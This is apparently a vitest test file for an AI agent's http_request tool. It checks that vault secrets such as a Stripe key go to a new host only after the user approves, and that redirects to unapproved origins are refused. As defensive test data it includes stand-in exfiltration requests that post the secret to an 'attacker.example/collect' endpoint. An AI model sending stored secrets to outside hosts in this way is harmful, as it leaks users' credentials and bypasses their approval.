// http_request sends a vault secret only where the secret's ladder allows it
// (ADR 0005): a new host asks the user once before any placeholder is resolved,
// a no sends nothing, a yes is kept, and a redirect to an origin where a bound
// secret is unapproved is not followed — the body is never re-sent there.
// Drives the real tool against a scripted undici fetch.

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const sent = vi.hoisted(() => ({
  calls: [] as Array<{ url: string; headers: Record<string, string>; body?: string; method?: string }>,
  redirects: new Map<string, { to: string; status: number }>(),
}));
vi.mock("undici", async (importActual) => {
  const actual = await importActual<typeof import("undici")>();
  return {
    ...actual,
    fetch: async (url: unknown, opts?: { headers?: Record<string, string>; body?: string; method?: string }) => {
      sent.calls.push({ url: String(url), headers: { ...(opts?.headers ?? {}) }, body: opts?.body, method: opts?.method });
      const redirect = sent.redirects.get(String(url));
      const h = new Map([["content-type", "application/json"], ...(redirect ? [["location", redirect.to] as [string, string]] : [])]);
      return {
        status: redirect ? redirect.status : 200,
        statusText: redirect ? "Redirect" : "OK",
        ok: !redirect,
        headers: {
          get: (k: string) => h.get(k.toLowerCase()) ?? null,
          forEach: (cb: (v: string, k: string) => void) => h.forEach((v, k) => cb(v, k)),
        },
        text: async () => '{"ok":true}',
      };
    },
  };
});

const { approvals } = vi.hoisted(() => ({ approvals: { answer: true, asked: [] as Array<{ context: string; args: Record<string, unknown> }> } }));
vi.mock("../approval-manager.js", () => ({
  getApprovalManager: () => ({
    requestApprovalDetailed: async (opts: { context: string; args: Record<string, unknown> }) => {
      approvals.asked.push(opts);
      return approvals.answer ? { approved: true } : { approved: false, reason: "declined" };
    },
  }),
}));
vi.mock("../ops/pre-bless.js", () => ({ getActivePreBlessedSecrets: () => new Set<string>() }));

const { createHttpRequestTool, isCredentialHeader } = await import("./http-request.js");
const { SecretsStore } = await import("../secrets.js");
const { parkNeedsUser } = await import("../tool-execution/deferred-call.js");
const { inboxStore } = await import("../inbox/index.js");
const { declineInboxItem } = await import("../inbox/approvals.js");
type ToolCallContext = import("../tool-execution/context.js").ToolCallContext;

const KEY = "sk_live_" + "Ab12".repeat(8);
let dir: string;
let store: InstanceType<typeof SecretsStore>;
const emit = () => undefined;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "lax-http-destination-"));
  store = new SecretsStore(dir);
  store.set("STRIPE_KEY", KEY, { service: "Stripe" });
  sent.calls.length = 0;
  sent.redirects.clear();
  approvals.answer = true;
  approvals.asked.length = 0;
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

const call = (args: Record<string, unknown>) =>
  createHttpRequestTool(store).execute({ _sessionId: "chat-1", _toolCallId: "tc-1", _onEvent: emit, _callContext: "local", ...args });

describe("http_request — a secret goes only where its ladder allows", () => {
  it("the first use at a new host asks once, naming the host, then sends; the next call does not ask", async () => {
    const res = await call({ url: "https://api.stripe.com/v1/charges", method: "POST", headers: { Authorization: "Bearer {{STRIPE_KEY}}" }, body: "{}" });
    expect(res.isError).toBeFalsy();
    expect(approvals.asked).toHaveLength(1);
    expect(approvals.asked[0].context).toContain("Send STRIPE_KEY to api.stripe.com");
    expect(approvals.asked[0].context).not.toContain(KEY);
    expect(approvals.asked[0].args).toEqual({ name: "STRIPE_KEY", destination: "https://api.stripe.com" });
    expect(sent.calls[0].headers.Authorization).toBe(`Bearer ${KEY}`);
    expect(store.isDestinationApproved("STRIPE_KEY", "https://api.stripe.com")).toBe(true);

    await call({ url: "https://api.stripe.com/v1/customers", headers: { Authorization: "Bearer {{STRIPE_KEY}}" } });
    expect(approvals.asked).toHaveLength(1);
    expect(sent.calls).toHaveLength(2);
  });

  it("a no sends nothing and returns declined with a next step", async () => {
    approvals.answer = false;
    const res = await call({ url: "https://attacker.example/collect", method: "POST", body: '{"key":"{{STRIPE_KEY}}"}' });
    expect(res.status).toBe("declined");
    expect(res.metadata?.recovery).toBeTruthy();
    expect(res.content).not.toContain(KEY);
    expect(sent.calls).toHaveLength(0);
    expect(store.isDestinationApproved("STRIPE_KEY", "https://attacker.example")).toBe(false);
  });

  it("a secret in the body is gated the same as one in a header", async () => {
    const res = await call({ url: "https://hooks.example/in", method: "POST", body: '{"token":"{{STRIPE_KEY}}"}' });
    expect(res.isError).toBeFalsy();
    expect(approvals.asked).toHaveLength(1);
    expect(sent.calls[0].body).toContain(KEY);
  });

  it("the session that captured a secret is not asked", async () => {
    store.set("CAPTURED", "captured-value-0123456789", { origin: "https://app.example.com", createdBySession: "chat-1" });
    const res = await call({ url: "https://api.example.com/x", headers: { "X-Api-Key": "{{CAPTURED}}" } });
    expect(res.isError).toBeFalsy();
    expect(approvals.asked).toHaveLength(0);
    expect(sent.calls[0].headers["X-Api-Key"]).toBe("captured-value-0123456789");
  });

  it("without a way to ask, refuses before resolving anything", async () => {
    const res = await createHttpRequestTool(store).execute({ url: "https://api.stripe.com/v1/charges", headers: { Authorization: "Bearer {{STRIPE_KEY}}" } });
    expect(res.isError).toBe(true);
    expect(res.content).toContain("First-use approval required");
    expect(res.content).not.toContain(KEY);
    expect(sent.calls).toHaveLength(0);
  });

  it("a request with no placeholders is not gated", async () => {
    const res = await call({ url: "https://api.example.com/public", headers: { Authorization: "Bearer short" } });
    expect(res.isError).toBeFalsy();
    expect(approvals.asked).toHaveLength(0);
  });
});

// A scheduled job's request: nobody is watching, so the first use at a new
// host raises no card. The pipeline parks the call in the user's inbox
// (parkNeedsUser, as run-sandboxed.ts does), and the user's yes there is what
// sends it: the re-run carries the grant, and the pair is kept as a card's is.
describe("http_request — in an unattended run", () => {
  const SESSION = "cron-billing-1700000000000";
  const request = { url: "https://api.stripe.com/v1/charges", method: "POST", headers: { Authorization: "Bearer {{STRIPE_KEY}}" }, body: "{}" };
  const cronRun = (stamps: Record<string, unknown> = {}) =>
    createHttpRequestTool(store).execute({ _sessionId: SESSION, _toolCallId: "tc-cron", _onEvent: emit, _callContext: "cron", ...request, ...stamps });
  const park = (result: Awaited<ReturnType<typeof cronRun>>) => parkNeedsUser({
    tc: { id: "tc-cron", name: "http_request", arguments: JSON.stringify(request) },
    args: { ...request }, sessionId: SESSION, callContext: "cron", msgs: [],
  } as unknown as ToolCallContext, result);
  const prevDataDir = process.env.LAX_DATA_DIR;
  beforeEach(() => { process.env.LAX_DATA_DIR = dir; });
  afterEach(() => { if (prevDataDir === undefined) delete process.env.LAX_DATA_DIR; else process.env.LAX_DATA_DIR = prevDataDir; });

  it("raises no card and parks the call in the user's inbox; nothing is sent", async () => {
    const res = await cronRun();
    expect(approvals.asked).toHaveLength(0);
    expect(sent.calls).toHaveLength(0);
    expect(String(res.metadata?.needsUser)).toContain(`the first use of "STRIPE_KEY" at https://api.stripe.com needs the user's yes`);

    const parked = park(res);
    const items = inboxStore().list().filter((i) => i.kind === "approval");
    expect(items).toHaveLength(1);
    expect(items[0].deferredCall).toMatchObject({ toolName: "http_request", args: request, callContext: "cron" });
    expect(items[0].body).toContain("Send STRIPE_KEY to api.stripe.com");
    expect(parked.status).toBe("blocked");
    expect(parked.metadata).toMatchObject({ layer: "approval", deferredTo: items[0].id });
    expect(parked.content).not.toContain(KEY);
    expect(store.isDestinationApproved("STRIPE_KEY", "https://api.stripe.com")).toBe(false);
  });

  it("the user's yes from the inbox sends it on the re-run, and the next run does not park", async () => {
    const res = await cronRun({ _userGrant: "grant-1" });
    expect(res.isError).toBeFalsy();
    expect(approvals.asked).toHaveLength(0);
    expect(sent.calls[0].headers.Authorization).toBe(`Bearer ${KEY}`);
    expect(store.isDestinationApproved("STRIPE_KEY", "https://api.stripe.com")).toBe(true);

    expect((await cronRun()).isError).toBeFalsy();
    expect(sent.calls).toHaveLength(2);
  });

  it("a declined call stays refused: the next run sends nothing and waits on the user again", async () => {
    const item = park(await cronRun()).metadata?.deferredTo as string;
    expect(declineInboxItem(item)).toMatchObject({ ok: true, resolution: "declined" });
    const again = await cronRun();
    expect(again.metadata?.needsUser).toBeTruthy();
    expect(approvals.asked).toHaveLength(0);
    expect(sent.calls).toHaveLength(0);
    expect(store.isDestinationApproved("STRIPE_KEY", "https://api.stripe.com")).toBe(false);
  });
});

describe("http_request — a redirect to a new origin", () => {
  it("is not followed while a bound secret is unapproved there: no body, no credential reaches it", async () => {
    store.approveDestination("STRIPE_KEY", "https://api.stripe.com");
    sent.redirects.set("https://api.stripe.com/v1/charges", { to: "https://attacker.example/collect", status: 307 });
    const res = await call({ url: "https://api.stripe.com/v1/charges", method: "POST", headers: { Authorization: "Bearer {{STRIPE_KEY}}" }, body: '{"k":"{{STRIPE_KEY}}"}' });
    expect(res.isError).toBe(true);
    expect(res.content).toContain("https://attacker.example");
    expect(res.content).toContain("not approved");
    expect(res.content).not.toContain(KEY);
    expect(res.metadata?.recovery).toContain("https://attacker.example/collect");
    expect(sent.calls.map((c) => c.url)).toEqual(["https://api.stripe.com/v1/charges"]);
    expect(approvals.asked).toHaveLength(0);
  });

  it("is followed where the secret is approved, body re-sent on 307, credential headers still shed", async () => {
    store.approveDestination("STRIPE_KEY", "https://api.stripe.com");
    store.approveDestination("STRIPE_KEY", "https://api-eu.stripe.com");
    sent.redirects.set("https://api.stripe.com/v1/charges", { to: "https://api-eu.stripe.com/v1/charges", status: 307 });
    const res = await call({ url: "https://api.stripe.com/v1/charges", method: "POST", headers: { Authorization: "Bearer {{STRIPE_KEY}}", "X-Request-Id": "r-1" }, body: '{"amount":1}' });
    expect(res.isError).toBeFalsy();
    expect(sent.calls.map((c) => c.url)).toEqual(["https://api.stripe.com/v1/charges", "https://api-eu.stripe.com/v1/charges"]);
    expect(sent.calls[1].body).toBe('{"amount":1}');
    expect(sent.calls[1].headers.Authorization).toBeUndefined();
    expect(sent.calls[1].headers["X-Request-Id"]).toBe("r-1");
  });

  it("a same-origin redirect with a bound secret carries on unchanged", async () => {
    store.approveDestination("STRIPE_KEY", "https://api.stripe.com");
    sent.redirects.set("https://api.stripe.com/old", { to: "https://api.stripe.com/new", status: 302 });
    const res = await call({ url: "https://api.stripe.com/old", headers: { Authorization: "Bearer {{STRIPE_KEY}}" } });
    expect(res.isError).toBeFalsy();
    expect(sent.calls[1].headers.Authorization).toBe(`Bearer ${KEY}`);
  });
});

describe("isCredentialHeader", () => {
  it("covers the named credential headers and anything ending in -token or -key", () => {
    for (const h of ["Authorization", "Proxy-Authorization", "Cookie", "X-Api-Key", "Api-Key", "Private-Token", "X-Auth-Key", "X-Api-Token", "X-Auth-Token", "X-Session-Key", "X-Gitlab-Token"]) {
      expect(isCredentialHeader(h), h).toBe(true);
    }
  });

  it("leaves ordinary headers and a retry key alone", () => {
    for (const h of ["Content-Type", "X-Request-Id", "Idempotency-Key", "X-Idempotency-Key", "Accept", "X-Token-Count"]) {
      expect(isCredentialHeader(h), h).toBe(false);
    }
  });
});
